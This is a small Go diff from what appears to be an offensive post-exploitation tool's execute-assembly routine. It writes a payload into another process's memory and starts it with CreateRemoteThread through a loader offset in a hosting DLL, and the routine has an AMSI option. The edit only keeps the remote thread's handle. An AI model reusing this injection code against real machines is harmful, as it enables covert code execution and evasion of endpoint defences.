@@ -151,7 +151,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, amsi bool) erro
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return err
 	}
